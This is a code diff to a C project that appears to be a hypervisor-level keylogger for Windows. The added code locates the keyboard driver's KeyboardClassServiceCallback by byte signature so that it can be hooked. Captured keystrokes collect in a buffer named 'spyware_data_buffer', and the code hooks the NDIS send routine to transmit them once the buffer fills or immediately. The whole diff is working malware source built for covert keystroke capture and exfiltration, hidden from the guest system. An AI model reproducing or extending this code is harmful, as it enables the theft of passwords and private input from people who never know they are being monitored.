@@ -6,6 +6,18 @@
 #include <lib/util.h>
 #include <hooks/hooking.h>
 
+__attribute__((section(".vmm"))) uint64_t locate_KeyboardClassServiceCallback(uint64_t kbdclass){
+    byte_t sign[] = {
+        0x48, 0x8b, 0x49, 0x40,     // mov rcx, qword ptr [rcx+40h]
+        0x44, 0x8d, 0x4e, 0x32,     // lea r9d, [rsi+32h]
+        0x44, 0x8d, 0x46, 0x03      // lea r8d,[rsi+3]
+    };
+
+    uint64_t KeyboardClassServiceCallback = find_signature(kbdclass, sign, 12) - 0x3b;
+
+    return KeyboardClassServiceCallback;
+}
+
 __attribute__((section(".vmm"))) void handle_KeyboardClassServiceCallback_hook(vmexit_data_t *state){
 
     // Emulate PUSH RBP
@@ -80,7 +92,7 @@ __attribute__((section(".vmm"))) void handle_KeyboardClassServiceCallback_hook(v
         
         #if IMMEDIATE_SENDING
             shared_cores_data.send_pending = TRUE;
-            hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET), &shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_x, shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_rw);
+            hook_function(guest_virtual_to_physical(shared_cores_data.functions.ndisMSendNBLToMiniportInternal), &shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_x, shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_rw);
         #else
             // Activate preemption timer
             if (!shared_cores_data.send_pending){
@@ -97,7 +109,7 @@ __attribute__((section(".vmm"))) void handle_KeyboardClassServiceCallback_hook(v
             // Send if buffer is almost full
             if (shared_cores_data.spyware_data_buffer.length >= 150){
                 shared_cores_data.send_pending = TRUE;
-                hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET), &shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_x, shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_rw);
+                hook_function(guest_virtual_to_physical(shared_cores_data.functions.ndisMSendNBLToMiniportInternal), &shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_x, shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_rw);
             } 
         #endif
         
